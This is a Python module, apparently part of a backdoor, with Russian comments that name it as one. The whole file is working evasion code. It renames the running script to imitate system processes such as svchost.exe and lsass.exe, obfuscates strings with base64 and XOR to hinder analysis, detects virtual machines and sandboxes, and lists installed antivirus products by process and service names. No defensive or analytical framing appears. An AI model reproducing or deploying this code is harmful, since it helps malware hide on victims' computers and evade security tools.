import os
import sys
import logging
import platform
import random
import time
import hashlib
import base64
import ctypes
from typing import Dict, Any, Optional
import psutil

# Функция для маскировки под легитимный процесс
def disguise_as_legitimate_process() -> bool:
    """Маскирует бэкдор под легитимный системный процесс."""
    try:
        logging.info("Применение маскировки под легитимный процесс")
        
        if platform.system() == "Windows":
            return _disguise_windows()
        elif platform.system() == "Linux":
            return _disguise_linux()
        elif platform.system() == "Darwin":  # macOS
            return _disguise_macos()
        else:
            logging.warning(f"Маскировка не поддерживается для ОС: {platform.system()}")
            return False
            
    except Exception as e:
        logging.error(f"Ошибка при маскировке: {e}")
        return False

def _disguise_windows() -> bool:
    """Маскировка в Windows."""
    try:
        # Список легитимных процессов для маскировки
        legitimate_names = [
            "svchost.exe", "explorer.exe", "winlogon.exe", "csrss.exe",
            "wininit.exe", "services.exe", "lsass.exe", "dwm.exe"
        ]
        
        # Выбираем случайное имя
        new_name = random.choice(legitimate_names)
        
        # Переименовываем текущий процесс (если возможно)
        try:
            current_script = os.path.abspath(sys.argv[0])
            new_path = os.path.join(os.path.dirname(current_script), new_name)
            
            if not os.path.exists(new_path):
                os.rename(current_script, new_path)
                logging.info(f"Процесс переименован в: {new_name}")
                return True
        except:
            pass
        
        return False
        
    except Exception as e:
        logging.error(f"Ошибка при маскировке Windows: {e}")
        return False

def _disguise_linux() -> bool:
    """Маскировка в Linux."""
    try:
        # Список легитимных процессов для маскировки
        legitimate_names = [
            "systemd", "init", "kthreadd", "ksoftirqd", "kworker"
        ]
        
        # Выбираем случайное имя
        new_name = random.choice(legitimate_names)
        
        # Переименовываем текущий процесс
        try:
            current_script = os.path.abspath(sys.argv[0])
            new_path = os.path.join(os.path.dirname(current_script), new_name)
            
            if not os.path.exists(new_path):
                os.rename(current_script, new_path)
                logging.info(f"Процесс переименован в: {new_name}")
                return True
        except:
            pass
        
        return False
        
    except Exception as e:
        logging.error(f"Ошибка при маскировке Linux: {e}")
        return False

def _disguise_macos() -> bool:
    """Маскировка в macOS."""
    try:
        # Список легитимных процессов для маскировки
        legitimate_names = [
            "launchd", "kernel_task", "WindowServer", "Dock", "Finder"
        ]
        
        # Выбираем случайное имя
        new_name = random.choice(legitimate_names)
        
        # Переименовываем текущий процесс
        try:
            current_script = os.path.abspath(sys.argv[0])
            new_path = os.path.join(os.path.dirname(current_script), new_name)
            
            if not os.path.exists(new_path):
                os.rename(current_script, new_path)
                logging.info(f"Процесс переименован в: {new_name}")
                return True
        except:
            pass
        
        return False
        
    except Exception as e:
        logging.error(f"Ошибка при маскировке macOS: {e}")
        return False

# Функция для обфускации строк
def obfuscate_strings(text: str) -> str:
    """Обфусцирует строки для усложнения анализа.
    
    Args:
        text (str): Исходный текст
        
    Returns:
        str: Обфусцированный текст
    """
    try:
        # Простая обфускация через base64 и XOR
        key = random.randint(1, 255)
        encoded = base64.b64encode(text.encode()).decode()
        
        # XOR шифрование
        obfuscated = ""
        for char in encoded:
            obfuscated += chr(ord(char) ^ key)
        
        # Возвращаем в формате, который можно расшифровать
        return f"OBF_{key}_{base64.b64encode(obfuscated.encode()).decode()}"
        
    except Exception as e:
        logging.error(f"Ошибка при обфускации строк: {e}")
        return text

def deobfuscate_strings(obfuscated_text: str) -> str:
    """Расшифровывает обфусцированные строки.
    
    Args:
        obfuscated_text (str): Обфусцированный текст
        
    Returns:
        str: Расшифрованный текст
    """
    try:
        if not obfuscated_text.startswith("OBF_"):
            return obfuscated_text
        
        # Извлекаем ключ и зашифрованный текст
        parts = obfuscated_text.split("_", 2)
        if len(parts) != 3:
            return obfuscated_text
        
        key = int(parts[1])
        encrypted = base64.b64decode(parts[2]).decode()
        
        # XOR расшифрование
        decrypted = ""
        for char in encrypted:
            decrypted += chr(ord(char) ^ key)
        
        # Base64 расшифрование
        return base64.b64decode(decrypted).decode()
        
    except Exception as e:
        logging.error(f"Ошибка при расшифровке строк: {e}")
        return obfuscated_text

# Функция для проверки виртуальной машины
def detect_virtual_environment() -> Dict[str, Any]:
    """Определяет, запущен ли бэкдор в виртуальной среде."""
    try:
        logging.info("Проверка виртуальной среды")
        
        vm_indicators = {
            "vmware": False,
            "virtualbox": False,
            "hyperv": False,
            "qemu": False,
            "overall": False
        }
        
        if platform.system() == "Windows":
            vm_indicators.update(_detect_vm_windows())
        elif platform.system() == "Linux":
            vm_indicators.update(_detect_vm_linux())
        elif platform.system() == "Darwin":  # macOS
            vm_indicators.update(_detect_vm_macos())
        
        # Общий результат
        vm_indicators["overall"] = any([
            vm_indicators["vmware"], vm_indicators["virtualbox"],
            vm_indicators["hyperv"], vm_indicators["qemu"]
        ])
        
        logging.info(f"Результат проверки VM: {vm_indicators}")
        return vm_indicators
        
    except Exception as e:
        logging.error(f"Ошибка при проверке VM: {e}")
        return {"overall": False, "error": str(e)}

def _detect_vm_windows() -> Dict[str, bool]:
    """Определение VM в Windows."""
    indicators = {}
    
    try:
        # Проверяем процессы
        vm_processes = {
            "vmware": ["vmware.exe", "vmwaretray.exe", "vmwareuser.exe"],
            "virtualbox": ["vboxservice.exe", "vboxtray.exe"],
            "hyperv": ["vmms.exe", "vmwp.exe"]
        }
        
        for vm_type, processes in vm_processes.items():
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'] in processes:
                        indicators[vm_type] = True
                        break
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        
    except Exception as e:
        logging.error(f"Ошибка при проверке VM в Windows: {e}")
    
    return indicators

def _detect_vm_linux() -> Dict[str, bool]:
    """Определение VM в Linux."""
    indicators = {}
    
    try:
        # Проверяем файлы системы
        vm_files = {
            "vmware": ["/proc/scsi/scsi", "/proc/ide/hda/driver"],
            "virtualbox": ["/proc/devices", "/sys/devices/virtual/dmi/id/product_name"],
            "qemu": ["/proc/cpuinfo", "/sys/devices/virtual/dmi/id/sys_vendor"]
        }
        
        for vm_type, files in vm_files.items():
            for file_path in files:
                try:
                    if os.path.exists(file_path):
                        with open(file_path, 'r') as f:
                            content = f.read().lower()
                            
                            if vm_type == "vmware" and "vmware" in content:
                                indicators["vmware"] = True
                            elif vm_type == "virtualbox" and "virtualbox" in content:
                                indicators["virtualbox"] = True
                            elif vm_type == "qemu" and "qemu" in content:
                                indicators["qemu"] = True
                                
                except (OSError, IOError):
                    continue
        
    except Exception as e:
        logging.error(f"Ошибка при проверке VM в Linux: {e}")
    
    return indicators

def _detect_vm_macos() -> Dict[str, bool]:
    """Определение VM в macOS."""
    indicators = {}
    
    try:
        # Проверяем команды
        vm_commands = {
            "vmware": ["vmware-tools-daemon"],
            "virtualbox": ["VBoxService", "VBoxControl"],
            "qemu": ["qemu-system-x86_64"]
        }
        
        for vm_type, commands in vm_commands.items():
            for cmd in commands:
                try:
                    import subprocess
                    result = subprocess.run(
                        ["which", cmd],
                        capture_output=True,
                        timeout=5
                    )
                    if result.returncode == 0:
                        indicators[vm_type] = True
                        break
                except:
                    continue
        
    except Exception as e:
        logging.error(f"Ошибка при проверке VM в macOS: {e}")
    
    return indicators

# Функция для проверки антивируса
def detect_antivirus() -> Dict[str, Any]:
    """Определяет наличие антивирусного ПО.
    
    Returns:
        Dict[str, Any]: Информация об антивирусе
    """
    try:
        logging.info("Проверка антивирусного ПО")
        
        av_info = {
            "detected": False,
            "products": [],
            "overall": False
        }
        
        if platform.system() == "Windows":
            av_info.update(_detect_av_windows())
        elif platform.system() == "Linux":
            av_info.update(_detect_av_linux())
        elif platform.system() == "Darwin":  # macOS
            av_info.update(_detect_av_macos())
        
        av_info["overall"] = av_info["detected"]
        
        logging.info(f"Результат проверки антивируса: {av_info}")
        return av_info
        
    except Exception as e:
        logging.error(f"Ошибка при проверке антивируса: {e}")
        return {"detected": False, "overall": False, "error": str(e)}

def _detect_av_windows() -> Dict[str, Any]:
    """Определение антивируса в Windows."""
    av_info = {"detected": False, "products": []}
    
    try:
        # Список известных антивирусов
        av_products = {
            "Windows Defender": ["MsMpEng.exe", "SecurityHealthService.exe"],
            "Avast": ["avast.exe", "avastui.exe", "AvastSvc.exe"],
            "AVG": ["avgui.exe", "avgnt.exe", "avgsvc.exe"],
            "Kaspersky": ["avp.exe", "avpui.exe", "klif.sys"],
            "Norton": ["norton.exe", "norton360.exe", "ccsvchst.exe"],
            "McAfee": ["mcshield.exe", "mcui.exe", "mcupdate.exe"],
            "Bitdefender": ["bdredline.exe", "bdagent.exe", "bdredline.exe"],
            "ESET": ["ekrn.exe", "egui.exe", "ekrn.exe"],
            "Malwarebytes": ["mbam.exe", "mbamservice.exe", "mbamtray.exe"],
            "Trend Micro": ["tmntsrv.exe", "tmbmsrv.exe", "tmbmsrv.exe"]
        }
        
        # Проверяем процессы
        for av_name, processes in av_products.items():
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'] in processes:
                        av_info["detected"] = True
                        if av_name not in av_info["products"]:
                            av_info["products"].append(av_name)
                        break
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        
        # Проверяем службы
        av_services = {
            "Windows Defender": ["WinDefend", "SecurityHealthService"],
            "Avast": ["avast!", "avast! Antivirus"],
            "AVG": ["avgfws", "avgwd"],
            "Kaspersky": ["AVP", "KAVFS"],
            "Norton": ["Norton", "Norton 360"],
            "McAfee": ["McAfee", "McAfeeEngine"],
            "Bitdefender": ["Bitdefender", "BDVpnService"],
            "ESET": ["ekrn", "egui"],
            "Malwarebytes": ["MBAMService", "MBAMChameleon"],
            "Trend Micro": ["TMBMServer", "TMBMServer"]
        }
        
        for av_name, services in av_services.items():
            for service in services:
                try:
                    result = subprocess.run(
                        ["sc", "query", service],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    if result.returncode == 0 and "RUNNING" in result.stdout:
                        av_info["detected"] = True
                        if av_name not in av_info["products"]:
                            av_info["products"].append(av_name)
                        break
                except:
                    continue
        
    except Exception as e:
        logging.error(f"Ошибка при проверке антивируса в Windows: {e}")
    
    return av_info

def _detect_av_linux() -> Dict[str, Any]:
    """Определение антивируса в Linux."""
    av_info = {"detected": False, "products": []}
    
    try:
        # Список известных антивирусов для Linux
        av_products = {
            "ClamAV": ["clamd", "clamscan", "freshclam"],
            "Sophos": ["sav", "savd", "savupdate"],
            "McAfee": ["uvscan", "uvscan", "uvscan"],
            "Kaspersky": ["kav4fs", "kav4fs", "kav4fs"],
            "Avast": ["avast", "avast", "avast"],
            "AVG": ["avg", "avg", "avg"],
            "Comodo": ["cav", "cav", "cav"],
            "F-Prot": ["f-prot", "f-prot", "f-prot"],
            "Panda": ["panda", "panda", "panda"],
            "Trend Micro": ["tmbmsrv", "tmbmsrv", "tmbmsrv"]
        }
        
        # Проверяем процессы
        for av_name, processes in av_products.items():
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'] in processes:
                        av_info["detected"] = True
                        if av_name not in av_info["products"]:
                            av_info["products"].append(av_name)
                        break
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        
        # Проверяем команды
        for av_name, commands in av_products.items():
            for cmd in commands:
                try:
                    result = subprocess.run(
                        ["which", cmd],
                        capture_output=True,
                        timeout=5
                    )
                    if result.returncode == 0:
                        av_info["detected"] = True
                        if av_name not in av_info["products"]:
                            av_info["products"].append(av_name)
                        break
                except:
                    continue
        
    except Exception as e:
        logging.error(f"Ошибка при проверке антивируса в Linux: {e}")
    
    return av_info

def _detect_av_macos() -> Dict[str, Any]:
    """Определение антивируса в macOS."""
    av_info = {"detected": False, "products": []}
    
    try:
        # Список известных антивирусов для macOS
        av_products = {
            "XProtect": ["XProtect", "XProtect"],
            "Gatekeeper": ["Gatekeeper", "Gatekeeper"],
            "Avast": ["avast", "avast"],
            "AVG": ["avg", "avg"],
            "Kaspersky": ["kav", "kav"],
            "Norton": ["norton", "norton"],
            "McAfee": ["mcafee", "mcafee"],
            "Bitdefender": ["bitdefender", "bitdefender"],
            "ESET": ["eset", "eset"],
            "Malwarebytes": ["malwarebytes", "malwarebytes"],
            "Trend Micro": ["trendmicro", "trendmicro"]
        }
        
        # Проверяем процессы
        for av_name, processes in av_products.items():
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'] in processes:
                        av_info["detected"] = True
                        if av_name not in av_info["products"]:
                            av_info["products"].append(av_name)
                        break
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        
        # Проверяем системные компоненты
        try:
            result = subprocess.run(
                ["system_profiler", "SPApplicationsDataType"],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                output = result.stdout.lower()
                
                for av_name in av_products.keys():
                    if av_name.lower() in output:
                        av_info["detected"] = True
                        if av_name not in av_info["products"]:
                            av_info["products"].append(av_name)
                            
        except:
            pass
        
    except Exception as e:
        logging.error(f"Ошибка при проверке антивируса в macOS: {e}")
    
    return av_info

# Функция для применения всех мер скрытности
def apply_stealth_measures() -> Dict[str, Any]:
    """Применяет все доступные меры скрытности."""
    try:
        logging.info("Применение мер скрытности")
        
        results = {
            "disguise": False,
            "vm_detection": {},
            "overall": False
        }
        
        # Маскировка под легитимный процесс
        try:
            results["disguise"] = disguise_as_legitimate_process()
        except Exception as e:
            logging.error(f"Ошибка при маскировке: {e}")
        
        # Проверка виртуальной среды
        try:
            results["vm_detection"] = detect_virtual_environment()
        except Exception as e:
            logging.error(f"Ошибка при проверке VM: {e}")
        
        # Общий результат
        results["overall"] = (
            results["disguise"] and
            not results["vm_detection"].get("overall", False)
        )
        
        logging.info(f"Результаты применения мер скрытности: {results}")
        return results
        
    except Exception as e:
        logging.error(f"Ошибка при применении мер скрытности: {e}")
        return {"overall": False, "error": str(e)}
